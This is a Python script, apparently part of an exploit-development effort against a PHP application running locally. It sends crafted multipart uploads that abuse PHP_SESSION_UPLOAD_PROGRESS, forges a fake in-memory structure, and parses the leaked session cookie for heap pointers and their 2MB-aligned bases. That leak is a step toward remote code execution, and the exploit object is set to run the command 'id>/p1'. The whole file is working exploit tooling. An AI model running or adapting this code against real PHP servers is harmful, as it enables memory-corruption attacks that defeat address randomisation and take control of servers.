#!/usr/bin/env python3
"""Dump exact 8-byte pointer values (step 8) in the 0x77xx heap range + their 2MB bases."""
import struct, sys, re, urllib.parse, time
from collections import Counter

sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, Exploit, build_multipart, SID

t = Target("http://127.0.0.1:18113/index.php", timeout=120.0)
ex = Exploit(t, "id>/p1", htdata_offset=0x690d8, profile="bookworm")

parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"},
          {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
          ex._file_part(), ex._big_field()]
t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)
time.sleep(0.2)

parts = [{"name": "PHPSESSID", "data": SID},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(ex.stage1_n):
    val = (f"v{i:04d}" + "x"*44)[:48]
    parts.append({"name": str(1000+i), "data": val.encode()})
forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
respB = t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)

m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", respB)
raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
print(f"cookie len: {len(raw)}")

c = Counter()
for i in range(0, len(raw)-7, 8):
    v = int.from_bytes(raw[i:i+8], "little")
    if 0x770000000000 <= v < 0x77ffffffffff:
        c[v] += 1
print(f"\nunique 0x77xx pointers (step 8): {len(c)}")
for v, cnt in sorted(c.items(), key=lambda kv: -kv[1])[:40]:
    base = v & ~0x1FFFFF
    print(f"  0x{v:012x}  count={cnt:3d}  base2M=0x{base:012x}  off_in_block=0x{v-base:x}")
